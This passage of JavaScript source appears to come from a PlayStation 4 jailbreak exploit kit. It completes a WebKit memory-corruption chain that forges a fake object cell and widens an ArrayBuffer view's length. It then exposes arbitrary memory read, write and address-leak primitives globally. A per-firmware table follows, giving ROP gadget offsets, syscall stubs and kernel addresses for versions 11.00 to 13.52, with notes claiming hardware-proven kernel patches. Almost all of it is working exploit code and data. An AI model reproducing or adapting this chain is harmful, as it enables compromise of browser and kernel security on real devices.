    if (pairStatus.promoted)
      throw new Error("mem.promote: already promoted");
    if (carrier === null || typeof carrier.aim !== "function")
      throw new TypeError("mem.promote: no carrier");
    if (fakeCellReleased())
      throw new Error("mem.promote: core.js already released the fake cell");
    const fake = carrier;
    const profile2 = fake.profile;
    if (!profile2 || typeof profile2.vectorOffset !== "number" || typeof profile2.butterflyOffset !== "number" || typeof profile2.inlineSlotOffset !== "number")
      throw new TypeError("mem.promote: carrier has no layout profile");
    if (typeof fake.hostAddress !== "number" || !fake.validate(fake.hostAddress) || typeof fake.fakeAddress !== "number" || !fake.validate(fake.fakeAddress) || fake.fakeAddress - fake.hostAddress !== profile2.inlineSlotOffset)
      throw new TypeError(`mem.promote: the fake cell's address is unusable (host=${fake.hostAddress} fake=${fake.fakeAddress})`);
    const VECTOR_OFF = profile2.vectorOffset;
    const LENGTH_OFF = VECTOR_OFF + 8;
    const MODE_OFF = LENGTH_OFF + 4;
    const BUTTERFLY_OFF = profile2.butterflyOffset;
    pairStatus.vectorOffset = VECTOR_OFF;
    pairStatus.lengthOffset = LENGTH_OFF;
    pairStatus.modeOffset = MODE_OFF;
    pairStatus.butterflyOffset = BUTTERFLY_OFF;
    let committed2 = false;
    let rebound = false;
    try {
      note("PAIR-BEGIN", `window=${fake.windowBytes}-vector=+${VECTOR_OFF}-length=+${LENGTH_OFF}-mode=+${MODE_OFF}`);
      const mainRecord = carrierHeaderCopy();
      const mainHomeVector = carrierHomeVector();
      if (!(mainRecord instanceof Uint8Array) || mainRecord.length < PAIR_HEADER_BYTES)
        throw new Error("mem.promote: core.js's carrier record is the wrong shape");
      const recordVector = low48At2(mainRecord, VECTOR_OFF);
      pairStatus.mainVector = toI64(mainHomeVector);
      pairStatus.mainRecordVector = toI64(recordVector);
      pairStatus.mainWindow = u32At(mainRecord, LENGTH_OFF);
      pairStatus.structureID = u32At(mainRecord, 0);
      note("PAIR-MAIN-RECORD", `home=0x${pairStatus.mainVector.toString()}-record=0x${pairStatus.mainRecordVector.toString()}-len=${pairStatus.mainWindow}-mode=${mainRecord[MODE_OFF]}-sid=0x${(pairStatus.structureID >>> 0).toString(16)}`);
      if (recordVector !== mainHomeVector)
        throw new Error(`mem.promote: profile.vectorOffset disagrees with the recorded home vector (record 0x${pairStatus.mainRecordVector.toString()} vs home 0x${pairStatus.mainVector.toString()})`);
      if (!fake.validate(mainHomeVector) || mainHomeVector % 8 !== 0)
        throw new Error(`mem.promote: the recorded home vector is implausible (0x${pairStatus.mainVector.toString()})`);
      if (pairStatus.mainWindow !== fake.windowBytes)
        throw new Error(`mem.promote: the record's m_length (${pairStatus.mainWindow}) is not the carrier window (${fake.windowBytes}) -- LENGTH_OFF does not hold on main`);
      mainView = fake.view;
      retained.push(mainView);
      if (!(mainView instanceof Uint8Array) || mainView.length !== fake.windowBytes || MAIN_IDENT_OFFSET + 8 > fake.windowBytes)
        throw new Error("mem.promote: the carrier's view is not what core.js described");
      pairStatus.fakeAddress = toI64(fake.fakeAddress);
      pairStatus.fakeButterfly = read8(fake.fakeAddress + BUTTERFLY_OFF);
      note("PAIR-FAKE-BUTTERFLY", `host=0x${toI64(fake.hostAddress).toString()}-fake=0x${pairStatus.fakeAddress.toString()}-butterfly=0x${pairStatus.fakeButterfly.toString()}`);
      workerBuffer = new ArrayBuffer(WORKER_BUFFER_SIZE);
      workerView = new Uint8Array(workerBuffer);
      workerMirror = new Uint8Array(workerBuffer);
      retained.push(workerBuffer, workerView, workerMirror);
      workerMirror[0] = HOME_BYTE;
      for (let i = 0; i < 8; ++i)
        workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];
      if (workerView[0] !== HOME_BYTE)
        throw new Error("mem.promote: workerView does not alias workerMirror");
      for (let i = 0; i < 8; ++i)
        mainView[MAIN_IDENT_OFFSET + i] = mainMagic[i];
      for (let i = 0; i < 8; ++i) {
        if (mainView[MAIN_IDENT_OFFSET + i] !== mainMagic[i])
          throw new Error("mem.promote: main's magic did not read back through its own JS view -- the carrier is not at home");
      }
      const mainAddr = addrNumber(leakval(mainView));
      const workerAddr = addrNumber(leakval(workerView));
      pairStatus.mainAddress = toI64(mainAddr);
      pairStatus.workerAddress = toI64(workerAddr);
      note("PAIR-CELLS", `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}`);
      if (mainAddr === workerAddr)
        throw new Error("mem.promote: main and worker leaked the same cell");
      if (mainAddr % 16 !== 0 || workerAddr % 16 !== 0)
        throw new Error("mem.promote: a leaked cell is not atom-aligned");
      const fromFakeSlot = read8(fake.fakeAddress + VECTOR_OFF);
      pairStatus.mainCellFromFakeSlot = fromFakeSlot;
      note("PAIR-MAIN-CELL", `fake-m_vector=0x${fromFakeSlot.toString()}-leakval=0x${pairStatus.mainAddress.toString()}-at=0x${toI64(fake.fakeAddress + VECTOR_OFF).toString()}`);
      if (fromFakeSlot.low !== pairStatus.mainAddress.low || fromFakeSlot.hi !== pairStatus.mainAddress.hi)
        throw new Error(`mem.promote: main CELL identity failed -- the fake cell's m_vector slot holds 0x${fromFakeSlot.toString()} but leakval(mainView) says 0x${pairStatus.mainAddress.toString()}`);
      proveMagic(
        note,
        "main",
        "mainIdentity",
        mainHomeVector + MAIN_IDENT_OFFSET,
        mainMagic,
        `home=0x${pairStatus.mainVector.toString()}-cell=0x${pairStatus.mainAddress.toString()}-offset=+0x${MAIN_IDENT_OFFSET.toString(16)}`
      );
      readInto(workerHeader, workerAddr, PAIR_HEADER_BYTES);
      const workerVector = low48At2(workerHeader, VECTOR_OFF);
      const workerButterfly = low48At2(workerHeader, BUTTERFLY_OFF);
      pairStatus.mode = workerHeader[MODE_OFF];
      pairStatus.workerWindow = u32At(workerHeader, LENGTH_OFF);
      pairStatus.workerVector = toI64(workerVector);
      pairStatus.workerButterfly = toI64(workerButterfly);
      note("PAIR-WORKER-HEADER", `sid=0x${u32At(workerHeader, 0).toString(16)}-vector=0x${pairStatus.workerVector.toString()}-len=${pairStatus.workerWindow}-mode=${pairStatus.mode}-butterfly=0x${pairStatus.workerButterfly.toString()}`);
      const gate = u32At(workerHeader, 0) === pairStatus.structureID && (workerHeader[7] === 0 || workerHeader[7] === 1) && pairStatus.workerWindow === WORKER_BUFFER_SIZE && workerHeader[MODE_OFF] === mainRecord[MODE_OFF] && workerHeader[MODE_OFF + 1] === 0 && workerHeader[MODE_OFF + 2] === 0 && workerHeader[MODE_OFF + 3] === 0 && canonical48(workerHeader, BUTTERFLY_OFF) && workerButterfly > 4294967296 && workerButterfly % 8 === 0 && canonical48(workerHeader, VECTOR_OFF) && fake.validate(workerVector) && workerVector % 8 === 0 && workerVector !== mainHomeVector;
      if (!gate)
        throw new Error(`mem.promote: header gate failed worker-len=${pairStatus.workerWindow} worker-mode=${workerHeader[MODE_OFF]} main-mode=${mainRecord[MODE_OFF]} worker-sid=${u32At(workerHeader, 0)} main-sid=${pairStatus.structureID} worker-vector=0x${pairStatus.workerVector.toString()} worker-butterfly=0x${pairStatus.workerButterfly.toString()} main-home=0x${pairStatus.mainVector.toString()}`);
      proveMagic(
        note,
        "worker",
        "workerIdentity",
        workerVector + PAIR_IDENT_OFFSET,
        workerMagic,
        `vector=0x${pairStatus.workerVector.toString()}-cell=0x${pairStatus.workerAddress.toString()}-offset=+0x${PAIR_IDENT_OFFSET.toString(16)}`
      );
      note("PAIR-IDENTITY", "main-cell=proved-main-buffer=proved-worker=proved");
      for (let i = 0; i < 8; ++i)
        workerOriginalVector[i] = workerHeader[VECTOR_OFF + i];
      for (let i = 0; i < 4; ++i)
        workerOriginalLength[i] = workerHeader[LENGTH_OFF + i];
      note("PAIR-COMMIT", `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-next=aim-without-restore`);
      aimFor(workerAddr, PAIR_HEADER_BYTES);
      committed2 = true;
      pairStatus.committed = true;
      for (let i = 0; i < 4; ++i)
        mainView[LENGTH_OFF + i] = 255;
      pairStatus.workerLength = workerView.length;
      if (pairStatus.workerLength !== WORKER_LENGTH_MAX)
        throw new Error(`mem.promote: the m_length write did not land -- worker.length reads ${pairStatus.workerLength}`);
      if (workerMirror.length !== WORKER_BUFFER_SIZE)
        throw new Error("mem.promote: the mirror was widened too -- the write went somewhere structural, not to worker's m_length");
      if (workerView[0] !== HOME_BYTE)
        throw new Error("mem.promote: worker no longer sees its own buffer");
      if (mainView[MODE_OFF] !== workerHeader[MODE_OFF] || mainView[MODE_OFF + 1] !== 0 || mainView[MODE_OFF + 2] !== 0 || mainView[MODE_OFF + 3] !== 0)
        throw new Error("mem.promote: m_mode was disturbed by the widening");
      for (let i = 0; i < 8; ++i) {
        if (mainView[VECTOR_OFF + i] !== workerOriginalVector[i])
          throw new Error("mem.promote: worker's m_vector moved during the widening");
      }
      note("PAIR-WIDENED", `length=0x${WORKER_LENGTH_MAX.toString(16)}-mode=0x${pairStatus.mode.toString(16)}`);
      pairVectorOffset = VECTOR_OFF;
      carrier = buildPairCarrier(fake);
      rebound = true;
      readInto(identityBytes2, workerVector + PAIR_IDENT_OFFSET, 8);
      if (!sameBytes2(identityBytes2, workerMagic, 8))
        throw new Error(`mem.promote: read through the pair returned ${hexOf(identityBytes2, 8)}, expected ${hexOf(workerMagic, 8)}`);
      write8(
        workerVector + PAIR_IDENT_OFFSET,
        new int64(218893066, 67305985)
      );
      const back = [10, 11, 12, 13, 1, 2, 3, 4];
      for (let i = 0; i < 8; ++i) {
        if (workerMirror[PAIR_IDENT_OFFSET + i] !== back[i])
          throw new Error(`mem.promote: write through the pair failed at byte ${i}`);
      }
      for (let i = 0; i < 8; ++i)
        workerMirror[PAIR_IDENT_OFFSET + i] = workerMagic[i];
      const workerAgain = addrNumber(leakval(workerView));
      pairStatus.leakvalAgrees = workerAgain === workerAddr;
      if (!pairStatus.leakvalAgrees)
        throw new Error(`mem.promote: leakval through the pair disagrees (0x${toI64(workerAgain).toString()} vs 0x${pairStatus.workerAddress.toString()})`);
      const mv = read8(mainAddr + VECTOR_OFF);
      if (mv.low !== pairStatus.workerAddress.low || mv.hi !== pairStatus.workerAddress.hi)
        throw new Error(`mem.promote: main.m_vector reads 0x${mv.toString()}, expected worker's cell 0x${pairStatus.workerAddress.toString()}`);
      if (read4(mainAddr + LENGTH_OFF) !== fake.windowBytes)
        throw new Error("mem.promote: main's own m_length was disturbed");
      note("PAIR-REPROVED", `main-m_vector=0x${mv.toString()}-leakval=0x${toI64(workerAgain).toString()}`);
      note("PAIR-RELEASE", "next=release-fake-cell-and-debris");
      const rel = releaseFakeCell();
      pairStatus.released = rel.released;
      pairStatus.historyCleared = !!rel.historyCleared;
      if (!fakeCellReleased())
        throw new Error("mem.promote: core.js did not release the fake cell");
      if (fake.assertHome() !== false)
        throw new Error("mem.promote: core.js's carrier still reports itself live");
      pairStatus.promoted = true;
      pairStatus.state = "pair";
      pairStatus.error = null;
      note("PAIR-UP", `main=0x${pairStatus.mainAddress.toString()}-worker=0x${pairStatus.workerAddress.toString()}-home=0x${pairStatus.mainVector.toString()}-mode=0x${pairStatus.mode.toString(16)}-sid=0x${pairStatus.structureID.toString(16)}-released=${pairStatus.released.length}-history-cleared=${pairStatus.historyCleared}`);
      return pairStatus;
    } catch (error) {
      pairStatus.failedAt = pairStatus.stage;
      pairStatus.error = `${error && error.name}: ${String(error && error.message)}`;
      let clean = true;
      if (committed2) {
        pairStatus.rolledBack = true;
        try {
          for (let i = 0; i < 8; ++i)
            mainView[VECTOR_OFF + i] = workerOriginalVector[i];
          for (let i = 0; i < 4; ++i)
            mainView[LENGTH_OFF + i] = workerOriginalLength[i];
        } catch {
          clean = false;
        }
        try {
          fake.restore();
        } catch {
          clean = false;
        }
        try {
          if (!(workerView.length === WORKER_BUFFER_SIZE && workerMirror.length === WORKER_BUFFER_SIZE && workerView[0] === HOME_BYTE && fake.assertHome() === true))
            clean = false;
        } catch {
          clean = false;
        }
        pairStatus.rollbackClean = clean;
      }
      try {
        pairStatus.mainAtHome = fake.assertHome();
      } catch {
        pairStatus.mainAtHome = null;
      }
      pairStatus.promoted = false;
      pairStatus.fallback = true;
      pairStatus.state = committed2 && !clean ? "broken" : "fake";
      if (pairStatus.state === "broken")
        carrier = brokenCarrier(pairStatus.error);
      else if (rebound)
        carrier = fake;
      pairVectorOffset = -1;
      workerView = null;
      workerMirror = null;
      workerBuffer = null;
      mainView = null;
      note("PAIR-FALLBACK", `state=${pairStatus.state}-committed=${committed2}-rollback-clean=${pairStatus.rollbackClean}-main-at-home=${pairStatus.mainAtHome}-at=${pairStatus.failedAt}-${pairStatus.error}`);
      throw error;
    }
  }
  function installWindowP(c, options) {
    if (!c || typeof c.aim !== "function")
      throw new TypeError("mem: not a carrier");
    carrier = c;
    const prim = {
      read1,
      read2,
      read4,
      read8,
      write1,
      write2,
      write4,
      write8,
      leakval
    };
    globalThis.p = prim;
    const opts = options || {};
    if (opts.promote === false) {
      pairStatus.state = "disabled";
      pairStatus.stage = "disabled";
      pairStatus.error = "promotion disabled by the caller (negative control)";
      return prim;
    }
    try {
      promoteToRealPair(opts.onEvent);
    } catch {
      if (pairStatus.state === "broken") {
        globalThis.p = void 0;
        throw new Error(`mem: the promotion failed AND its rollback did not verify -- window.p has been WITHDRAWN rather than published mis-aimed. failedAt=${pairStatus.failedAt} ${pairStatus.error}`);
      }
    }
    return prim;
  }

  // slopkit/ps4_offsets.js
  var PS4 = {
    "11.00": {
      fw_status: "state=proven step4q=90/0 reboot=0 kernel_rvas=5/5-vs-dump",
      k_idt_rsvd: 2958384,
      wk_expm1_builtin: 35209008,
      wk_JSFunction_m_function: 40,
      wk_CSSFontFace_vtable: 56785576,
      wk___imp___error: 57547880,
      k__error: 13168,
      wk___imp_strerror: 57547928,
      c_strerror: 68864,
      wk_POP_RDI_RET: 219040,
      wk_POP_RAX_RET: 321193,
      wk_MOV_RDI_RSI_30_CALL: 38645336,
      wk_POP_RAX_MOV_RAX_JMP_18: 18701651,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 3086480,
      wk_MOV_RDI_RAX_8_CALL_20: 268929,
      wk_MOV_RDX_RAX_18_CALL_10: 9502694,
      wk_PUSH_RDX_POP_RSP_RET: 30171258,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 38875,
      wk_LEAVE_RET: 204701,
      wk_POP_RSI_RET: 149986,
      wk_POP_RDX_RET: 68881,
      wk_POP_RCX_RET: 464407,
      wk_POP_R8_RET: 938914,
      wk_POP_R9_RET: 6554529,
      pivot_view_sp: 24,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      k_getpid: 111232,
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_evf_cv: 8372847,
      k_sysent_661: 17863504,
      k_jmp_rsi: 465441
    },
    "11.50": {
      fw_status: "state=proven step4q=90/0 reboot=0 webkit=step7-20/20-x2 kernel_rvas=untested-vs-dump kstr_residue=0x318",
      wk_expm1_builtin: 39353296,
      wk_JSFunction_m_function: 40,
      wk_POP_RDI_RET: 38031937,
      wk_POP_RSI_RET: 38812830,
      wk_POP_RDX_RET: 38599202,
      wk_POP_RCX_RET: 38567615,
      wk_POP_RAX_RET: 39145023,
      wk_POP_R8_RET: 37467325,
      wk_POP_R9_RET: 29543841,
      wk_LEAVE_RET: 37500816,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 38034714,
      wk_MOV_RDI_RSI_30_CALL: 43387384,
      wk_POP_RAX_MOV_RAX_JMP_18: 29932483,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 23351920,
      wk_MOV_RDI_RAX_8_CALL_20: 31717269,
      wk_MOV_RDX_RAX_18_CALL_10: 31367530,
      wk_PUSH_RDX_POP_RSP_RET: 44818442,
      pivot_view_sp: 56,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      wk___imp___error: 63687832,
      k__error: 99264,
      wk___imp_pthread_create: 63691704,
      k_pthread_create: 41424,
      k_stubs: {
        3: 180592,
        4: 178384,
        5: 178544,
        6: 185888,
        20: 183152,
        23: 177904,
        24: 185824,
        25: 177360,
        30: 182736,
        54: 184304,
        92: 177744,
        97: 184400,
        98: 177648,
        104: 185216,
        105: 177296,
        106: 185472,
        118: 176880,
        135: 180864,
        240: 185536,
        331: 181936,
        432: 177424,
        466: 183408,
        487: 178816,
        488: 179472,
        538: 177200,
        539: 177392,
        544: 179888,
        545: 182832,
        632: 184464,
        633: 186432,
        662: 183472,
        663: 181216,
        664: 186176,
        666: 185664,
        669: 179696
      },
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_evf_cv: 7881496,
      k_sysent_661: 17868640,
      k_jmp_rsi: 459989
    },
    "12.00": {
      fw_status: "state=UNTESTED-on-hardware webkit=offline-from-sprx anchor=findcaller-validated-on-11.50 kernel_rvas=verified-vs-kernel_1202.elf kpatch=10/10-sites-verified",
      k_idt_rsvd: 1842432,
      wk_expm1_builtin: 39342224,
      wk_JSFunction_m_function: 40,
      wk_POP_RDI_RET: 299055,
      wk_POP_RSI_RET: 69175,
      wk_POP_RDX_RET: 3962,
      wk_POP_RCX_RET: 343051,
      wk_POP_RAX_RET: 143187,
      wk_POP_R8_RET: 143186,
      wk_POP_R9_RET: 6338241,
      wk_LEAVE_RET: 71715,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 177611,
      wk_PUSH_RDX_POP_RSP_RET: 44806202,
      wk_MOV_RDI_RSI_30_CALL: 43375832,
      wk_POP_RAX_MOV_RAX_JMP_18: 9324659,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 2645520,
      wk_MOV_RDI_RAX_8_CALL_20: 7109389,
      wk_MOV_RDX_RAX_18_CALL_10: 13860042,
      pivot_view_sp: 56,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      wk___imp___error: 63687752,
      k__error: 170432,
      wk___imp_pthread_create: 63691648,
      k_pthread_create: 151040,
      k_stubs: {
        3: 180576,
        4: 178368,
        5: 178528,
        6: 185872,
        20: 183136,
        23: 177888,
        24: 185808,
        25: 177344,
        30: 182720,
        54: 184288,
        92: 177728,
        97: 184384,
        98: 177632,
        104: 185200,
        105: 177280,
        106: 185456,
        118: 176864,
        135: 180848,
        240: 185520,
        331: 181920,
        432: 177408,
        466: 183392,
        487: 178800,
        488: 179456,
        538: 177184,
        539: 177376,
        544: 179872,
        545: 182816,
        632: 184448,
        633: 186416,
        662: 183456,
        663: 181200,
        664: 186160,
        666: 185648,
        669: 179680
      },
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_evf_cv: 7882648,
      k_sysent_661: 17868640,
      k_jmp_rsi: 293681
    },
    "13.00": {
      fw_status: "state=proven step10=32/0-x3 reboot=0 webkit=step7-20/20 anchor=findcaller kernel_rvas=verified-on-hardware kpatch=1300.bin-10-sites-verified bug=poops",
      k_idt_rsvd: 1842496,
      wk_expm1_builtin: 39348352,
      wk_JSFunction_m_function: 40,
      wk_POP_RDI_RET: 377984,
      wk_POP_RSI_RET: 451678,
      wk_POP_RDX_RET: 1230266,
      wk_POP_RCX_RET: 113374,
      wk_POP_RAX_RET: 66820,
      wk_POP_R8_RET: 635665,
      wk_POP_R9_RET: 1953713,
      wk_LEAVE_RET: 99063,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 21643,
      wk_PUSH_RDX_POP_RSP_RET: 44813482,
      wk_MOV_RDI_RSI_30_CALL: 43383112,
      wk_POP_RAX_MOV_RAX_JMP_18: 31033827,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 2472672,
      wk_MOV_RDI_RAX_8_CALL_20: 4850694,
      wk_MOV_RDX_RAX_18_CALL_10: 32258778,
      pivot_view_sp: 56,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      wk___imp___error: 63671496,
      k__error: 156704,
      wk___imp_pthread_create: 63675392,
      k_pthread_create: 65808,
      k_stubs: {
        3: 180592,
        4: 178384,
        5: 178544,
        6: 185888,
        20: 183152,
        23: 177904,
        24: 185824,
        25: 177360,
        30: 182736,
        54: 184304,
        92: 177744,
        97: 184400,
        98: 177648,
        104: 185216,
        105: 177296,
        106: 185472,
        118: 176880,
        135: 180864,
        240: 185536,
        331: 181936,
        432: 177424,
        466: 183408,
        487: 178816,
        488: 179472,
        538: 177200,
        539: 177392,
        544: 179888,
        545: 182832,
        632: 184464,
        633: 186432,
        662: 183472,
        663: 181216,
        664: 186176,
        666: 185664,
        669: 179696
      },
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_kl_lock: 945184,
      k_evf_cv: 0,
      k_sysent_661: 17868640,
      k_jmp_rsi: 293681,
      k_oid_kern_file: 27457696,
      k_oid_maxfilesperproc: 27457872,
      k_oid_maxprocperuid: 27507336,
      k_oid_maxfiles: 27457960,
      k_arg1_maxfilesperproc: 36488316,
      k_arg1_maxprocperuid: 36488312,
      k_arg1_maxfiles: 36488308,
      k_sysctl_handle_int: 4169872,
      k_prison0: 2764e4,
      k_rootvnode: 34827920,
      k_sysent: 17836912
    },
    "12.50": {
      fw_status: "state=UNTESTED-on-hardware webkit=addfw-from-decrypted-12.50-modules (15/15 gadgets, 35/35 stubs) anchor=findcaller-offline (self-check reproduces the known 11.50 and 12.00 anchors) kernel_rvas=asserted-by-supplied-table STILL-UNVERIFIED (no 12.50 kernel dump) but CORROBORATED: all three byte-verified in the 13.00 hardware dump AND in kernel_1202.elf at the identical RVAs, and 12.02<->13.00 share their first megabyte 96.7% at ZERO shift (11.00<->12.02 is 3.7%), so 12.50/12.52 sit between two builds whose low text does not move kpatch=1250.bin bug=poops",
      wk_expm1_builtin: 39342352,
      wk_JSFunction_m_function: 40,
      wk_POP_RDI_RET: 299055,
      wk_POP_RSI_RET: 69175,
      wk_POP_RDX_RET: 487914,
      wk_POP_RCX_RET: 384761,
      wk_POP_RAX_RET: 143187,
      wk_POP_R8_RET: 143186,
      wk_POP_R9_RET: 6338241,
      wk_LEAVE_RET: 490666,
      wk_MOV_QWORD_PTR_RDI_RAX_RET: 177611,
      wk_PUSH_RDX_POP_RSP_RET: 44806330,
      wk_MOV_RDI_RSI_30_CALL: 43375960,
      wk_POP_RAX_MOV_RAX_JMP_18: 9324659,
      wk_PUSH_RBP_MOV_RBP_RSP_10: 2645520,
      wk_MOV_RDI_RAX_8_CALL_20: 7109389,
      wk_MOV_RDX_RAX_18_CALL_10: 13860042,
      pivot_view_sp: 56,
      wk_ArrayBuffer_m_impl: 16,
      wk_ArrayBuffer_m_contents_m_data: 16,
      wk___imp___error: 63654984,
      k__error: 55760,
      wk___imp_pthread_create: 63658880,
      k_pthread_create: 146720,
      k_stubs: {
        3: 180576,
        4: 178368,
        5: 178528,
        6: 185872,
        20: 183136,
        23: 177888,
        24: 185808,
        25: 177344,
        30: 182720,
        54: 184288,
        92: 177728,
        97: 184384,
        98: 177632,
        104: 185200,
        105: 177280,
        106: 185456,
        118: 176864,
        135: 180848,
        240: 185520,
        331: 181920,
        432: 177408,
        466: 183392,
        487: 178800,
        488: 179456,
        538: 177184,
        539: 177376,
        544: 179872,
        545: 182816,
        632: 184448,
        633: 186416,
        662: 183456,
        663: 181200,
        664: 186160,
        666: 185648,
        669: 179680
      },
      k_scan_stage1: 262144,
      k_scan_stage2: 393216,
      k_evf_cv: 0,
      k_sysent_661: 17868640,
      k_jmp_rsi: 293681,
      k_kl_lock: 945184
    }
  };
  PS4["13.50"] = {
    fw_status: "state=663-JB-PROVEN-on-hw webkit=13.00-module libkernel=13.50-stubs kernel_rvas=MEASURED-from-kernel_1350.elf (kderive 16/16, adversarial 16/16 GO) kpatch=1350.bin-BUILT-10/10-neg-controls-pass-UNTESTED-on-hw bug=663",
    wk_expm1_builtin: 39348352,
    wk_JSFunction_m_function: 40,
    wk_POP_RDI_RET: 377984,
    wk_POP_RSI_RET: 451678,
    wk_POP_RDX_RET: 1230266,
    wk_POP_RCX_RET: 113374,
    wk_POP_RAX_RET: 66820,
    wk_POP_R8_RET: 635665,
    wk_POP_R9_RET: 1953713,
    wk_LEAVE_RET: 99063,
    wk_MOV_QWORD_PTR_RDI_RAX_RET: 21643,
    wk_PUSH_RDX_POP_RSP_RET: 44813482,
    wk_MOV_RDI_RSI_30_CALL: 43383112,
    wk_POP_RAX_MOV_RAX_JMP_18: 31033827,
    wk_PUSH_RBP_MOV_RBP_RSP_10: 2472672,
    wk_MOV_RDI_RAX_8_CALL_20: 4850694,
    wk_MOV_RDX_RAX_18_CALL_10: 32258778,
    pivot_view_sp: 56,
    wk_ArrayBuffer_m_impl: 16,
    wk_ArrayBuffer_m_contents_m_data: 16,
    wk___imp___error: 63671496,
    k__error: 106736,
    wk___imp_pthread_create: 63675392,
    k_pthread_create: 137104,
    k_stubs: {
      3: 180592,
      4: 178384,
      5: 178544,
      6: 185888,
      20: 183152,
      23: 177904,
      24: 185824,
      25: 177360,
      30: 182736,
      54: 184304,
      92: 177744,
      97: 184400,
      98: 177648,
      104: 185216,
      105: 177296,
      106: 185472,
      118: 176880,
      135: 180864,
      240: 185536,
      331: 181936,
      432: 177424,
      466: 183408,
      487: 178816,
      488: 179472,
      538: 177200,
      539: 177392,
      544: 179888,
      545: 182832,
      632: 184464,
      633: 186432,
      662: 183472,
      663: 181216,
      664: 186176,
      666: 185664,
      669: 179696
    },
    k_scan_stage1: 262144,
    k_scan_stage2: 393216,
    k_idt_rsvd: 1842528,
    k_sysctl_handle_int: 4170976,
    k_jmp_rsi: 293681,
    k_kl_lock: 945184,
    k_evf_cv: 7884312,
    k_sysent: 17836912,
    k_sysent_661: 17868640,
    k_oid_kern_file: 27457696,
    k_oid_maxfilesperproc: 27457872,
    k_oid_maxprocperuid: 27507336,
    k_oid_maxfiles: 27457960,
    k_arg1_maxfilesperproc: 36488316,
    k_arg1_maxprocperuid: 36488312,
    k_arg1_maxfiles: 36488308,
    k_prison0: 2764e4,
    k_rootvnode: 34827920,
    kpatch: "1350.bin"
  };
  PS4["13.52"] = Object.assign({}, PS4["13.50"], {
    alias_of: "13.50",
    k_idt_rsvd: 1842688,
    k_oid_kern_file: 27457696,
    k_oid_maxfilesperproc: 27457872,
    k_oid_maxprocperuid: 27507336,
    k_oid_maxfiles: 27457960,
    k_arg1_maxfilesperproc: 36488316,
    k_arg1_maxprocperuid: 36488312,
    k_arg1_maxfiles: 36488308,
    k_sysctl_handle_int: 4172e3,
    k_prison0: 2764e4,
    k_rootvnode: 34827920,
    k_sysent: 17836912,
    k_sysent_661: 17868640,
    k_jmp_rsi: 317136,
    k_kl_lock: 945248,
    k_evf_cv: 7885352,
    kpatch: "1352.bin",
    fw_status: "state=663-LIVE-on-hardware shares=13.50 (webkit+libkernel) kernel_rvas=MEASURED-from-kernel_1352.elf (kdump5 tier1 36MB pass=39/0, kderive 16/16 recipes) kpatch=1352.bin-24-sites-verified-OFFLINE-ONLY bug=663"
  });
  PS4["13.02"] = Object.assign({}, PS4["13.00"], {
    alias_of: "13.00",
    k_idt_rsvd: 1842512,
    k_sysctl_handle_int: 4169888,
    k_jmp_rsi: 293681,
    k_kl_lock: 945184,
    k_evf_cv: 7883224,
    k_sysent: 17836912,
    k_sysent_661: 17868640,
    k_oid_kern_file: 27457696,
    k_oid_maxfilesperproc: 27457872,
    k_oid_maxprocperuid: 27507336,
    k_oid_maxfiles: 27457960,
    k_arg1_maxfilesperproc: 36488316,
    k_arg1_maxprocperuid: 36488312,
    k_arg1_maxfiles: 36488308,
    k_prison0: 2764e4,
    k_rootvnode: 34827920,
    kpatch: "1302.bin",
    fw_status: "state=663-JB+KPATCH-PROVEN-on-hw-pass=51 shares=13.00 (webkit+libkernel, PRIMITIVE-OK) kernel_rvas=MEASURED-from-kernel_1302.elf (16/16 GO) same-kernel-as=13.04 kpatch=1302.bin-HW-PROVEN-KEXEC-rc0 bug=663"
  });
  PS4["13.04"] = Object.assign({}, PS4["13.00"], {
    alias_of: "13.00",
    k_idt_rsvd: 1842512,
    k_sysctl_handle_int: 4169888,
    k_jmp_rsi: 293681,
    k_kl_lock: 945184,
    k_evf_cv: 7883224,
    k_sysent: 17836912,
    k_sysent_661: 17868640,
    k_oid_kern_file: 27457696,
    k_oid_maxfilesperproc: 27457872,
    k_oid_maxprocperuid: 27507336,
    k_oid_maxfiles: 27457960,
    k_arg1_maxfilesperproc: 36488316,
    k_arg1_maxprocperuid: 36488312,
    k_arg1_maxfiles: 36488308,
    k_prison0: 2764e4,
    k_rootvnode: 34827920,
    kpatch: "1302.bin",
    fw_status: "state=663-JB+KPATCH-via-13.02(pass=51) shares=13.00 (webkit+libkernel, PRIMITIVE-OK) kernel_rvas=SAME-KERNEL-AS-13.02 (measured from kernel_1302.elf, 16/16 GO) kpatch=1302.bin-shared-HW-PROVEN bug=663"
  });
  PS4["12.02"] = Object.assign({}, PS4["12.00"], {
    alias_of: "12.00",
    fw_status: "state=UNTESTED-on-hardware shares=12.00 kernel_rvas=verified-vs-kernel_1202.elf (this firmware) kpatch=1200.bin-10-sites-verified bug=lapse",
    kpatch: "1200.bin"
  });
  PS4["12.52"] = Object.assign({}, PS4["12.50"], {
    alias_of: "12.50",
    fw_status: "state=UNTESTED-on-hardware shares=12.50 webkit=assumed-identical-to-12.50 (no 12.52 module dump) kernel_rvas=STILL-UNVERIFIED but corroborated via 12.02+13.00 dumps kpatch=1250.bin bug=poops",
    kpatch: "1250.bin"
  });
  PS4["11.52"] = Object.assign({}, PS4["11.50"], {
    alias_of: "11.50",
    fw_status: "state=UNTESTED-on-hardware shares=11.50 webkit=assumed-identical-to-11.50 kernel_rvas=untested-vs-dump kpatch=1150.bin",
    kpatch: "1150.bin"
  });
